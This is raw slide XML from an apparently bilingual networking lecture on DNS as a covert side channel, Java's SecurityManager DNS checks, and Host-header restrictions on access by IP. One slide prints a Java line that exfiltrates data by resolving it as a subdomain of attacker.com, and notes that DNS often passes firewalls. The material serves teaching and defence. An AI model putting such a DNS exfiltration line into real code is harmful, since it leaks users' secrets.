              <a:t>// Malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>恶意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> code exfiltrating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>窃取</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> data via DNS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>stolenData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> = "secret data 123";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>stolenData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> + ".attacker.com");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This sends "secret123.attacker.com" to the attacker's DNS server, leaking information.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. Bypassing Firewalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>绕过防火墙</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Many networks allow DNS (UDP 53) even when other outbound traffic is blocked.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1524000" y="181806"/>
            <a:ext cx="8229600" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The Hidden Channel Problem : DNS as a Side Channel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6077119" y="684870"/>
            <a:ext cx="5486400" cy="4770537"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="q"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Java’s  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>SecurityManager.checkConnect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>()  can restrict DNS lookups to prevent this. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx2">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="q"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>The key method: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>checkConnect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>(String host, int port) , When port = -1, it checks if DNS resolution is allowed for the host.  Throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>SecurityException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> if the JVM security policy blocks DNS for that host.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx2">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx2">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SecurityManager</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.getSecurityManager</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> != null) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    try {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sm.checkConnect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("example.com", -1); // Checks DNS permission</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("DNS resolution allowed for example.com");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    } catch (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SecurityException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> e) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("Blocked DNS lookup for example.com");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="217714" y="4824616"/>
            <a:ext cx="5878286" cy="1915909"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Key Points</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>SecurityManager</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>A legacy Java class that enforces security policies (e.g., restricting network access).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>If null, no security restrictions are active (common in modern Java apps).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>checkConnect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>("host", -1)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>The -1 port argument specifically checks DNS resolution permission (not a socket connection).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>SecurityException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t> if the app lacks permission to resolve the hostname.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6055348" y="5651789"/>
            <a:ext cx="5356142" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Use Cases</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Security-sensitive apps: Verify DNS access before resolving untrusted domains.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Sandboxed environments: Applets or legacy systems where DNS lookups are restricted.</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2" y="152400"/>
            <a:ext cx="10820398" cy="74189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indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Why not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> the website directly via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP?</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="1143000"/>
            <a:ext cx="11582399" cy="556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400" dirty="0"/>
              <a:t>Known:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Type in your browser: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>http://www.szu.edu.cn</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB"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GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Input: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>http://210.39.3.164</a:t>
            </a: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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7"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51678"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2040466" y="1143000"/>
            <a:ext cx="4588934" cy="7943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391" y="2439989"/>
            <a:ext cx="5629275" cy="3905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8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2282" y="2546882"/>
            <a:ext cx="5676900" cy="381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8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304800" y="1143000"/>
            <a:ext cx="11734799" cy="556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400" dirty="0"/>
              <a:t>Known:</a:t>
            </a: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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Type in the browser: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>http://www.126.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB"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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Input: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>http://125.90.204.122</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB"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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2867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34821"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2165931" y="1143000"/>
            <a:ext cx="4479925" cy="695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084" y="2506132"/>
            <a:ext cx="6315075" cy="3743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68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3159" y="2506132"/>
            <a:ext cx="5105400" cy="3743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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457202" y="152400"/>
            <a:ext cx="10820398" cy="74189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indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Why not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> the website directly via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP?</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="3200" b="1"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12" end="1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8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76201" y="737174"/>
            <a:ext cx="11963400" cy="59684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US" sz="2400" dirty="0"/>
              <a:t>When you type http://www.126.com in the browser, you can access the website.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> However, attempting to access by IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>http://125.90.204.122 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>will not work. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>This limitation is not due to a client-side issue, but rather a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>server-side restriction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> based on the Host field in the HTTP request header. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>When accessing the server via http://www.126.com, the Host field value is set to http://www.126.com. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>In contrast, when using the IP address </a:t>
            </a:r>
            <a:r>
